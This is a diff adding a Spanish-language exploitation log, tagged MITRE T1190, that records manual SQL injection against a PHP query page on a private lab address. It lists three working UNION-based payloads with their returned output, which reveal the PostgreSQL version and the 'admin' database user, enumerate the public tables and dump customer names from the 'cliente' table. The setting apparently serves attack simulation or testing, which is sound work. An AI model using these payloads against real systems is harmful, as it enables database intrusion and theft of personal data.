@@ -1,0 +1,25 @@
+[T1190] Explotación manual de inyección SQL en http://192.168.100.20/consultas.php
+Requiere que agent-db esté arriba (la app depende de esa conexión).
+
+=== 1. Confirmar inyección + versión + usuario de conexión ===
+Payload (64 caracteres): xyz' UNION SELECT 1, version() || ' | user: ' || current_user --
+                            <li>
+                    ID: 1                    Nombre: PostgreSQL 17.11 (Debian 17.11-0+deb13u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit | user: admin                </li>
+                    </ul>
+
+=== 2. Listar tablas del esquema público ===
+Payload (88 caracteres): xyz' UNION SELECT 1,string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--
+                            <li>
+                    ID: 1                    Nombre: cliente                </li>
+                    </ul>
+
+=== 3. Volcar datos reales de la tabla cliente ===
+Payload (42 caracteres): xyz' UNION SELECT id,nombre FROM cliente--
+                            <li>
+                    ID: 1                    Nombre: ana                </li>
+                            <li>
+                    ID: 2                    Nombre: juan                </li>
+                            <li>
+                    ID: 3                    Nombre: kendall                </li>
+                    </ul>
+
